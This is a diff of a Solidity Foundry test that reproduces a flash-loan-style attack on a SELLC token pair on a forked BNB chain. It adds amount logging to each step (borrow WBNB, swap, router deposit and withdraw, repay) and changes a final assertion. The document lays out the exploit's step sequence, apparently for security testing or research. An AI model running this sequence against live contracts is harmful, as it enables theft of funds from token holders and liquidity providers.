@@ -268,15 +268,39 @@ contract SellTokenTestBase is Test, BlockLoader {
         vm.startPrank(attacker);
         vm.warp(blockTimestamp);
         vm.roll(26854757);
+        emit log_named_uint("amt0", 428 ether);
         borrow_wbnb_owner(428 ether);
         printBalance("After step0 ");
+        emit log_named_uint(
+            "amt1",
+            (wbnb.balanceOf(address(attacker)) * 99) / 100
+        );
+        emit log_named_uint(
+            "amt2",
+            pair.getAmountOut(
+                (wbnb.balanceOf(address(attacker)) * 99) / 100,
+                address(wbnb)
+            )
+        );
         swap_pair_attacker_wbnb_sellc(
             (wbnb.balanceOf(address(attacker)) * 99) / 100,
-            5000000 ether
+            pair.getAmountOut(
+                (wbnb.balanceOf(address(attacker)) * 99) / 100,
+                address(wbnb)
+            )
         );
         printBalance("After step1 ");
+        emit log_named_uint("amt3", 4 ether);
         deposit_srouter_wbnb_sellc(4 ether);
         printBalance("After step2 ");
+        emit log_named_uint("amt4", sellc.balanceOf(address(attacker)));
+        emit log_named_uint(
+            "amt5",
+            pair.getAmountOut(
+                sellc.balanceOf(address(attacker)),
+                address(sellc)
+            )
+        );
         swap_pair_attacker_sellc_wbnb(
             sellc.balanceOf(address(attacker)),
             pair.getAmountOut(
@@ -285,8 +309,10 @@ contract SellTokenTestBase is Test, BlockLoader {
             )
         );
         printBalance("After step3 ");
+        emit log_named_uint("amt6", 0);
         withdraw_srouter_sellc_wbnb(0);
         printBalance("After step4 ");
+        emit log_named_uint("amt7", 428 ether);
         payback_wbnb_owner(428 ether);
         printBalance("After step5 ");
         require(attackGoal(), "Attack failed!");
@@ -313,7 +339,7 @@ contract SellTokenTestBase is Test, BlockLoader {
         swap_pair_attacker_sellc_wbnb(amt4, amt5);
         withdraw_srouter_sellc_wbnb(amt6);
         payback_wbnb_owner(amt7);
-        assert(!attackGoal());
+        require(!attackGoal(), "Attack succeed!");
         vm.stopPrank();
     }
 }
